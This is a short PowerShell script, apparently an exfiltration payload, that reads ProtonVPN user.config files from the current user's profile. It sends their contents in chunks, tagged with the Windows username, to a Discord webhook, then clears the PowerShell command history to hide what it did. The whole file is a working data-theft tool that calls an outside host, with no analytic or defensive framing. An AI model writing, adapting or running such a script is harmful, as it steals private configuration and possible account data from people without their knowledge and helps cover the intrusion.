$Path = "$Env:USERPROFILE\AppData\Local\ProtonVPN\ProtonVPN*\*\user.config"

$Content = Get-Content -Path $Path

$text = $Path + $Content

# Discord Connection
$hookurl = "$discord"

# Loop for Discord
$ConstantLimitForRestMethod = 1999
$TMP_Body = @{
	'username' = $env:username
	'content' = ""
}
 for($i = 0; $i -lt $text.Length; $i+=$ConstantLimitForRestMethod){
	try {
		$TMP_Body = @{
  			'username' = $env:username
  			'content' = $text.Substring($i, $ConstantLimitForRestMethod)
		}
	} catch [ArgumentOutOfRangeException] {
		if($text.Length-$i -gt 0){
			$TMP_Body = @{
  			'username' = $env:username
  			'content' = $text.Substring($i, $text.Length-$i)
			}
		} else {
			break
		}
	}
	Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($TMP_Body | ConvertTo-Json)
}


# Clear the PowerShell command history
Clear-History